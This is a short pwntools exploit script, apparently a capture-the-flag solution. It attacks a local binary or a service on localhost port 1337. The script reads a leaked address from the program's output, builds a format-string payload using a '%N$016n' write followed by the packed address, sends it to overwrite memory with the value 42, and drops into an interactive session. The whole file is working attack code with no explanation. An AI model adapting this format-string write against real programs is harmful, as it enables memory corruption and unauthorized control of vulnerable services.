#!/usr/bin/env python
import pwn
import binascii

REMOTE_ADDR = "127.0.0.1"
REMOTE_PORT = "1337"

# specific to my terminal - st
pwn.context.terminal = ["st", "-e", "sh", "-c"]

swap_endianness = lambda x: int.from_bytes(x, "little").to_bytes(8, "big")

def get_challenge(elf):
    if pwn.args.REMOTE:
        return pwn.remote(REMOTE_ADDR, REMOTE_PORT)
    elif pwn.args.GDB:
        chal = pwn.process(elf.path)
        pwn.gdb.attach(chal, """
                b * vuln + 149
                c
                """)
        return chal
    else:
        return pwn.process(elf.path)

elf = pwn.ELF("./chal")
chal = get_challenge(elf)

target_address = int(chal.readuntil("it? ").decode().split()[4][2:], 16)
pwn.log.info(f"Parsed target address as 0x{target_address:016x}")
target_value = 42

exploit = b"A" * target_value
offset = 10 + len(exploit) // 8 + 2
exploit += f"%{offset}$016n".encode()
exploit += b"A" * (len(exploit) % 8)
exploit += pwn.p64(target_address)

chal.sendline(exploit)

chal.interactive()
#chal.close()
